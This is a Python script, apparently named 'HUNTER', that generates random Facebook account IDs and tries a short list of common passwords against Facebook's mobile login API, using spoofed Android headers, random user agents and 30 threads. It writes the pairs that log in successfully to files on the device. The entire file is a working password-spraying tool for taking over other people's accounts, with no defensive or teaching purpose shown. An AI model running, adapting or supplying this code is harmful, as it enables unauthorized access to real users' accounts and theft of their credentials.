from concurrent.futures import ThreadPoolExecutor as tred
import requests,sys
from string import *
from os import system as cmd
from random import randint as rr
from random import choice as rc
from string import digits as digits
import requests
import os
import re
import sys
import random
import string
import time
from os import system as HUNTER
from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
from rich.padding import Padding
                     
def linex():
	print(51*f'â¢')

logo=(f"""
 
db   db db    db d8b   db d888888b d88888b d8888b.\n88   88 88    88 888o  88 `~~88~~' 88'     88  `8D\n88ooo88 88    88 88V8o 88    88    88ooooo 88oobY' \n88~~~88 88    88 88 V8o88    88    88~~~~~ 88`8b\n88   88 88b  d88 88  V888    88    88.     88 `88.\nYP   YP ~Y8888P' VP   V8P    YP    Y88888P 88   YD                                                                                                      
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   \033[1;32m    Author  : HunteR ReturN
   \033[1;32m    Version : 0.5         
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def clear():
        os.system('clear')
        print(logo)

loop,ok=0,0
class HUNTER:
    def __init__(self) -> None:
      self.sex=""
    def main(self):
       self.clear()
       print(Panel(" [â¢] 1. OLD CLONE 2009-2014\n [â¢] 2. Exit Menu"))
       self.frsc=input(" [â¢] Select : ")
       if self.frsc == "1":self.settings()
       else:main(self)
    def clear(self):cmd("clear");print(logo)
    def settings(self):
       self.clear();print(Panel(" [â¢] Example : 5000 7000 9000 10000 100000000"))
       self.limit=int(input(" [â¢] Enter Search Limit : "));self.user=[]
       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
       with tred(max_workers=30) as HUNTER:
           total=str(len(self.user));self.clear()
           print(" [â¢] Total Uid : %s"%(total))
           print(" [â¢] هزو ینان هت کوبسیف یدناب نا یف یو هنزیت");linex()
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','1234567','123123','12345678','123456789']
               HUNTER.submit(self.cracker,uid,pas,total)
       print();linex();print(" [â¢] Cracking Complete \n~>> Total OK : %s"%(ok))
       linex();input(" [â¢] Prees Enter To Exit ");exit()
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r [Afghan] %s | OK %s \r"%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              with requests.Session() as session:
                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20Â¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
              if "Please Confirm Email" in str(po):
                 print(Panel(f"\r\r [Afghan -OK]  {uid} | {ps} "));print(Panel(f" LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Afghan-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              elif "session_key" in po:
                 print(Panel(f"\r\r [Afghan-OK] {uid} | {ps} \033[0m"));print(Panel(f" LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/HUNTER-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              else:pass
          loop+=1
       except Exception as e:pass
       #Facebook 480.0.0.55.88 (455016452)
       
    def ua(self):
       aa = "Dalvik/2.1.0 (Linux; U; Android "+str(random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"]))+"; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/480.0.0.55.88;FBPN/"+str(random.choice(["com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.katana"]))+";FBLC/"+str(random.choice(["en_US","en_GB","en_PK","ru_RU","de_DE","th_TH","en_BD","en_IN","en_AF"]))+";FBBV/455016452;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/"+str(random.choice(["V2029","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","SM-A720F"])) +";FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
       return aa       
HUNTER().main()
